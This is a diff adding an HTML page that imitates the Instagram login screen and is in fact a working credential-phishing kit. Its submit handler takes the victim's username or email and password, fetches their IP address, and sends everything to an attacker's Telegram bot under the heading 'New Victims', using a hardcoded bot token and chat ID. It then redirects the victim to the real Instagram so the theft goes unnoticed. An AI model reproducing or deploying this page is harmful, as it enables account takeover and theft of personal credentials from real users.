@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            margin-top: 50px;
+            width: 100%;
+            max-width: 350px;
+        }
+        .language-select {
+            font-size: 14px;
+            color: #000000;
+            border: none;
+            background: transparent;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        .instagram-logo {
+            font-family: 'Pacifico', cursive;
+            font-size: 48px;
+            color: #000000;
+            margin-bottom: 30px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .input-field:focus {
+            border-color: #0095f6;
+            outline: none;
+        }
+        .alert {
+            color: red;
+            font-size: 12px;
+            display: none;
+            margin-top: 5px;
+            text-align: left;
+        }
+        .forgot-password {
+            float: right;
+            color: #0095f6;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .login-button:hover {
+            background-color: #007bbf;
+        }
+        .footer {
+            margin-top: 330px;
+            color: #8e8e8e;
+            font-size: 12px;
+            text-align: center;
+        }
+        .footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .password-container {
+            position: relative;
+            width: 100%;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #0095f6;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Language Dropdown -->
+        <select class="language-select">
+            <option value="en">English</option>
+            <option value="bn">বাংলা</option>
+        </select>
+
+        <!-- Instagram Logo -->
+        <div class="instagram-logo">Instagram</div>
+
+        <!-- Login Form -->
+        <form id="loginForm">
+            <input type="text" id="phoneEmail" class="input-field" placeholder="Phone number, username, or email">
+            <div id="phoneEmailAlert" class="alert">ফোন নম্বর, ইউজারনেম, বা ইমেইল দিন।</div>
+            <div class="password-container">
+                <input type="password" id="password" class="input-field" placeholder="Password">
+                <span id="togglePassword" class="toggle-password">Show</span>
+            </div>
+            <div id="passwordAlert" class="alert">পাসওয়ার্ড দিন।</div>
+            <a href="#" class="forgot-password">forget password</a>
+            <button type="submit" class="login-button">Log in</button>
+        </form>
+
+        <!-- Footer -->
+        <div class="footer">
+            <div>
+                <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a> 
+                <a href="#">Help</a> <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a>
+            </div>
+            <div style="margin-top: 10px;">
+                <a href="#">Locations</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a> 
+                <a href="#">Contact Uploading & Non-Users</a> <a href="#">Meta Verified</a>
+            </div>
+            <div style="margin-top: 10px;">
+                <select style="border: none; background: transparent; color: #8e8e8e;">
+                    <option>English ▼</option>
+                </select>
+                © 2025 Instagram from Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.textContent = type === 'password' ? 'Show' : 'Hide';
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const phoneEmail = document.getElementById('phoneEmail').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const phoneEmailAlert = document.getElementById('phoneEmailAlert');
+            const passwordAlert = document.getElementById('passwordAlert');
+
+            phoneEmailAlert.style.display = 'none';
+            passwordAlert.style.display = 'none';
+
+            if (!phoneEmail) {
+                phoneEmailAlert.style.display = 'block';
+                return;
+            }
+            if (!password) {
+                passwordAlert.style.display = 'block';
+                return;
+            }
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const loginTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' });
+                    const botToken = '6988425897:AAEc3nFqt411ryD_ndIlpyrLpkdf8MHjwKQ';
+                    const chatId = '5916486983';
+                    const message = `New Victims\nNumber or Gmail or Username➜ ${phoneEmail}\nPassword➜ ${password}\nIP Address➜ ${ip}\nLogin Time & Date (BD)➜ ${loginTime}\nLogin Page Type ➜ Instagram`;
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            window.location.href = 'https://www.instagram.com/';
+                        } else {
+                            console.error('Telegram error:', data);
+                        }
+                    })
+                    .catch(error => console.error('Error sending to Telegram:', error));
+                })
+                .catch(error => console.error('Error fetching IP:', error));
+        });
+    </script>
+</body>
+</html>
